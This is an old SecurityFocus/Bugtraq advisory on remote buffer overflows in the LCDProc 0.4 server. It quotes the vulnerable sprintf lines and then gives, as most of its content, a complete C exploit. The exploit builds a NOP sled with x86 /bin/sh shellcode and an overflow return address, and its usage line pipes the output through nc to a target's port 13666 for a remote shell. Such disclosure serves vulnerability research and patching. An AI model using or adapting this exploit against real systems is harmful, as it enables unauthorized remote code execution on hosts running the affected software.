source: http://www.securityfocus.com/bid/1131/info

A vulnerability exists in the server portion of version 0.4 of the LCDProc package. Several remote buffer overflows exist that could allow a remote attacker to corrupt memory and execute arbitrary code. As listed in the Bugtraq posting revealing this vulnerability, overflows exist at:

parse.c:149: sprintf(errmsg, "huh? Invalid command \"%s\"\n", argv[0]);
screenlist.c:119: sprintf(str, "ignore %s\n", old_s->id);
screenlist.c:134: sprintf(str, "listen %s\n", s->id);

It is possible to exploit this conditions to execute code with the privileges of the user LCDProc is running as.

/*****
 * lcdproc-exploit.c
 *****
 *
 * LCDproc 0.4-pre9 exploit
 # 
 # Andrew Hobgood <chaos@strange.net>
 * Kha0S on #LinuxOS/EFnet
 * 
 * Tested on Linux/x86 2.2.5-15smp (the only Intel box I could get my hands
 * on for testing).
 * 
 *****
 */
   
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#define BUFFERSIZE 269
#define NOP 0x90
#define OFFSET 0xbffff750
 
char shellcode[] =
        "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89"
        "\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c"
        "\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff"
        "\xff\xff/bin/sh";
   
int main(int argc, char **argv) {
        char *ptr, buffer[BUFFERSIZE];
        unsigned long *long_ptr, offset = OFFSET;
        int aux;
   
        fprintf(stderr, "LCDproc exploit by Andrew Hobgood <chaos@strange.net>\n\n");
        fprintf(stderr, "Usage: (%s [<offset>]; cat) | nc <target> 13666\n\n", argv[0]);

        if (argc == 2) offset += atol(argv[1]);

        ptr = buffer;
        memset(ptr, 0, sizeof(buffer));
        memset(ptr, NOP, sizeof(buffer) - strlen(shellcode) - 16);
        ptr += sizeof(buffer) - strlen(shellcode) - 16;
        memcpy(ptr, shellcode, strlen(shellcode));
        ptr += strlen(shellcode);
        long_ptr = (unsigned long *) ptr;
        for(aux=0; aux<4; aux++) *(long_ptr++) = offset;  
        ptr = (char *) long_ptr;
        *ptr = '\0';
   
        fprintf(stderr, "Buffer size: %d\n", (int) strlen(buffer));
        fprintf(stderr, "Offset: 0x%lx\n\n", offset);
        
        printf("hello\n");
        fflush(stdout);
        sleep(1);
        printf("screen_add {%s}\n", buffer);
        fflush(stdout);
        
        return(0);
}       
/*** end lcdproc-exploit.c ***/